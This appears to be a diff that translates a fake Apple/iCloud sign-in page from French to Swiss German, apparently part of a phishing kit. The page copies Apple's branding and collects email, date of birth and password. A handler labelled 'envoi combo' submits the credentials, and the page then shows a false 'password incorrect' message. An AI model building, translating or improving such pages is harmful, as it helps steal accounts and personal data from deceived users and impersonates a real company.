@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="fr-fr">
+<html lang="de-CH">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
@@ -515,7 +515,7 @@
       </svg>
     </a>
     <div class="nav-spacer"></div>
-    <button class="nav-ellipsis" aria-label="Plus d'options">
+    <button class="nav-ellipsis" aria-label="Weitere Optionen">
       <!-- Ellipsis dots from real iCloud source -->
       <svg viewBox="0 0 64 14" xmlns="http://www.w3.org/2000/svg" width="28" height="7">
         <circle cx="7" cy="7" r="6.3"/>
@@ -560,21 +560,21 @@
         </svg>
       </div>
 
-      <h1 id="main-title">Se connecter avec<br>un compte Apple</h1>
+      <h1 id="main-title">Mit Ihrem Apple<br>Konto anmelden</h1>
 
-      <!-- ÉTAPE 1 : EMAIL -->
+      <!-- SCHRITT 1: E-MAIL -->
       <div id="step1" style="width:100%">
         <input
           id="emailInput"
           type="text"
           class="input-field"
-          placeholder="E-mail ou numéro de téléphone"
+          placeholder="E-Mail oder Telefonnummer"
           autocomplete="username"
           autocorrect="off"
           autocapitalize="none"
           spellcheck="false"
         >
-        <a href="#" class="create-link">Créer un compte Apple</a>
+        <a href="#" class="create-link">Apple-Konto erstellen</a>
         <div class="separator"></div>
         <div class="privacy-block">
           <span class="privacy-icon">
@@ -586,42 +586,42 @@
             </svg>
           </span>
           <p class="privacy-text">
-            Les informations de votre compte Apple sont utilisées pour vous permettre de vous connecter en toute sécurité et d'accéder à vos données. Apple enregistre certaines données à des fins de sécurité, d'assistance et de signalement. Si vous l'acceptez, Apple peut également utiliser les informations de votre compte Apple pour vous envoyer des e-mails et des communications marketing en se basant notamment sur votre utilisation des services Apple. <a href="#">Découvrez comment sont gérées vos données…</a>
+            Die Informationen zu Ihrem Apple-Konto werden verwendet, um Sie sicher anmelden zu lassen und auf Ihre Daten zuzugreifen. Apple speichert bestimmte Daten für Sicherheits-, Support- und Meldezwecke. Wenn Sie dies akzeptieren, kann Apple die Informationen zu Ihrem Apple-Konto auch verwenden, um Ihnen E-Mails und Marketing-Mitteilungen auf Grundlage Ihrer Nutzung der Apple-Services zu senden. <a href="#">Weitere Informationen zur Verwaltung Ihrer Daten…</a>
           </p>
         </div>
         <div class="btn-row">
-          <button id="btnContinue" class="btn-continue" type="button">Continuer</button>
+          <button id="btnContinue" class="btn-continue" type="button">Fortfahren</button>
           <button type="button" class="btn-passkey">
             <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16">
               <path d="M12 2C9.243 2 7 4.243 7 7c0 1.879.938 3.54 2.367 4.547A7.002 7.002 0 0 0 5 18.5V19h2v-.5a5 5 0 0 1 10 0V19h2v-.5a7.002 7.002 0 0 0-4.367-6.453A4.993 4.993 0 0 0 17 7c0-2.757-2.243-5-5-5zm0 2a3 3 0 1 1 0 6 3 3 0 0 1 0-6z"/>
             </svg>
-            Se connecter avec un iPhone
+            Mit iPhone anmelden
           </button>
         </div>
-        <p class="btn-note">Nécessite un appareil doté d'iOS&nbsp;17 ou version ultérieure.</p>
+        <p class="btn-note">Erfordert ein Gerät mit iOS&nbsp;17 oder neuer.</p>
       </div>
 
-      <!-- ÉTAPE 1.5 : VÉRIFICATION DE L'ÂGE -->
+      <!-- SCHRITT 1.5: ALTERSBESTÄTIGUNG -->
       <div id="step1_5" style="width:100%">
         <div class="dob-container">
-          <label class="dob-label">Votre date de naissance</label>
+          <label class="dob-label">Ihr Geburtsdatum</label>
           <div class="dob-input-wrapper">
             <input
               id="dobInput"
               type="text"
               class="input-field"
-              placeholder="JJ/MM/AAAA"
+              placeholder="TT/MM/JJJJ"
               maxlength="10"
               inputmode="numeric"
             >
           </div>
-          <p class="dob-hint">Format: JJ/MM/AAAA</p>
+          <p class="dob-hint">Format: TT/MM/JJJJ</p>
         </div>
         <p class="error-msg" id="ageError"></p>
-        <button id="btnAgeVerify" class="btn-continue" type="button" style="width: 100%;">Continuer</button>
+        <button id="btnAgeVerify" class="btn-continue" type="button" style="width: 100%;">Fortfahren</button>
       </div>
 
-      <!-- ÉTAPE 2 : MOT DE PASSE -->
+      <!-- SCHRITT 2: PASSWORT -->
       <div id="step2">
         <button class="back-btn" id="btnBack" type="button">
           <svg width="8" height="13" viewBox="0 0 8 13" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -635,10 +635,10 @@
             id="passInput"
             type="password"
             class="input-field"
-            placeholder="Mot de passe"
+            placeholder="Passwort"
             autocomplete="current-password"
           >
-          <button type="button" class="eye-btn" id="eyeBtn" aria-label="Afficher le mot de passe">
+          <button type="button" class="eye-btn" id="eyeBtn" aria-label="Passwort anzeigen">
             <svg id="eyeIcon" width="20" height="14" viewBox="0 0 20 14" xmlns="http://www.w3.org/2000/svg">
               <path d="M10 0C5.5 0 1.7 2.8 0 7c1.7 4.2 5.5 7 10 7s8.3-2.8 10-7C18.3 2.8 14.5 0 10 0zm0 11.7c-2.6 0-4.7-2.1-4.7-4.7S7.4 2.3 10 2.3s4.7 2.1 4.7 4.7-2.1 4.7-4.7 4.7zm0-7.5c-1.5 0-2.8 1.3-2.8 2.8S8.5 9.8 10 9.8s2.8-1.3 2.8-2.8-1.3-2.8-2.8-2.8z" fill="currentColor"/>
             </svg>
@@ -646,11 +646,11 @@
         </div>
         <div class="check-row">
           <label class="check-label">
-            <input type="checkbox" id="stayCheck"> Rester connecté
+            <input type="checkbox" id="stayCheck"> Angemeldet bleiben
           </label>
-          <a href="#" class="forgot-link">Mot de passe oublié ?&nbsp;›</a>
+          <a href="#" class="forgot-link">Passwort vergessen?&nbsp;›</a>
         </div>
-        <button id="btnSignin" class="btn-signin" type="button">Se connecter</button>
+        <button id="btnSignin" class="btn-signin" type="button">Anmelden</button>
       </div>
 
     </div>
@@ -682,7 +682,7 @@
       // Show age verification step
       step1.style.display = 'none';
       step1_5.style.display = 'block';
-      title.innerHTML = 'Vérifier votre<br>date de naissance';
+      title.innerHTML = 'Geben Sie Ihr<br>Geburtsdatum ein';
       dobInput.focus();
     });
 
@@ -692,18 +692,18 @@
       var ageError = document.getElementById('ageError');
 
       if (!dobStr) {
-        ageError.textContent = 'Veuillez entrer votre date de naissance';
+        ageError.textContent = 'Bitte geben Sie Ihr Geburtsdatum ein';
         ageError.style.display = 'block';
         dobInput.focus();
         return;
       }
 
-      // Validate JJ/MM/AAAA format
+      // Validate TT/MM/JJJJ format
       var dobRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
       var match = dobStr.match(dobRegex);
 
       if (!match) {
-        ageError.textContent = 'Format invalide. Utilisez JJ/MM/AAAA';
+        ageError.textContent = 'Ungültiges Format. Verwenden Sie TT/MM/JJJJ';
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -715,14 +715,14 @@
 
       // Validate date ranges
       if (month < 1 || month > 12) {
-        ageError.textContent = 'Le mois doit être entre 01 et 12';
+        ageError.textContent = 'Der Monat muss zwischen 01 und 12 liegen';
         ageError.style.display = 'block';
         dobInput.focus();
         return;
       }
 
       if (day < 1 || day > 31) {
-        ageError.textContent = 'Le jour doit être entre 01 et 31';
+        ageError.textContent = 'Der Tag muss zwischen 01 und 31 liegen';
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -731,7 +731,7 @@
       // Check if year is reasonable (not in future, not too old)
       var currentYear = new Date().getFullYear();
       if (year > currentYear || year < 1900) {
-        ageError.textContent = 'L\'année est invalide';
+        ageError.textContent = 'Das Jahr ist ungültig';
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -740,7 +740,7 @@
       // Create date and validate it exists
       var dob = new Date(year, month - 1, day);
       if (dob.getDate() !== day || dob.getMonth() !== month - 1) {
-        ageError.textContent = 'Cette date n\'existe pas';
+        ageError.textContent = 'Dieses Datum existiert nicht';
         ageError.style.display = 'block';
         dobInput.focus();
         return;
@@ -771,12 +771,12 @@
         step1_5.style.display = 'none';
         emailDisplay.textContent = email;
         step2.style.display = 'block';
-        title.innerHTML = 'Saisissez votre<br>mot de passe';
+        title.innerHTML = 'Geben Sie Ihr<br>Passwort ein';
         passInput.focus();
       }
     });
 
-    // Auto-format DOB input as JJ/MM/AAAA
+    // Auto-format DOB input as TT/MM/JJJJ
     dobInput.addEventListener('input', function(){
       var val = this.value.replace(/\D/g, '');
       if (val.length > 0) {
@@ -790,14 +790,14 @@
       }
     });
 
-    // ── Retour étape 1 ──
+    // ── Zurück zu Schritt 1 ──
     document.getElementById('btnBack').addEventListener('click', function(){
       step2.style.display = 'none';
       step1.style.display = 'block';
-      title.innerHTML = 'Se connecter avec<br>un compte Apple';
+      title.innerHTML = 'Mit Ihrem Apple<br>Konto anmelden';
     });
 
-    // ── Étape 2 : envoi combo ──
+    // ── Schritt 2: Anmeldung senden ──
     document.getElementById('btnSignin').addEventListener('click', function(){
       var pass = passInput.value;
       if (!pass) { passInput.focus(); return; }
@@ -854,7 +854,7 @@
               hideLoadingOverlay(function() {
                 passInput.value = '';
                 var err = document.getElementById('passError');
-                err.textContent = 'Mot de passe incorrect. Veuillez réessayer.';
+                err.textContent = 'Passwort ist falsch. Bitte versuchen Sie es erneut.';
                 err.style.display = 'block';
                 passInput.focus();
               });
@@ -916,7 +916,7 @@
         <div class="blade"></div><div class="blade"></div><div class="blade"></div>
       </div>
 
-      <p class="loading-title">Connexion en cours…</p>
+      <p class="loading-title">Anmeldung wird durchgeführt…</p>
       <p class="loading-sub" id="loadingEmail"></p>
     </div>
   </div>
@@ -924,11 +924,11 @@
   <!-- FOOTER -->
   <footer class="site-footer">
     <nav class="footer-links">
-      <a href="#">État du système</a>
-      <a href="#">Engagement de confidentialité</a>
-      <a href="#">Conditions générales</a>
+      <a href="#">Systemstatus</a>
+      <a href="#">Datenschutzrichtlinie</a>
+      <a href="#">Allgemeine Geschäftsbedingungen</a>
     </nav>
-    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
+    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Alle Rechte vorbehalten.</span>
   </footer>
 
 
